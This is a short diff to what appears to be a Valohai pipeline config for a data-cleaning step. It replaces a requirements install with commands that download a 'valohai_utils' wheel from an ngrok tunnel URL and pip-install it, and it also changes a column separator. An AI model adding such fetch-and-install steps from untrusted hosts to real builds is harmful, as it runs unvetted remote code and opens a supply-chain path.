@@ -2,8 +2,12 @@
     name: jinga
     image: python:3.11-slim
     command:
-      - pip install -r requirements.txt
-      - python ./data_cleaning.py
+    - apt-get -y update
+    - apt-get -y install curl
+    - cd params
+    - curl -O https://7e7e-176-72-7-168.ngrok-free.app/valohai_utils-0.4.0-py3-none-any.whl
+    - pip install valohai_utils-0.4.0-py3-none-any.whl
+    - python data_cleaning.py
     inputs:
     - name: nemo
       optional: true
@@ -13,7 +17,7 @@
         - Name
         - Email
         multiple: separate
-        multiple-separator: ','
+        multiple-separator: '-'
         optional: true
         type: string
       - name: duplicate_lookup_columns
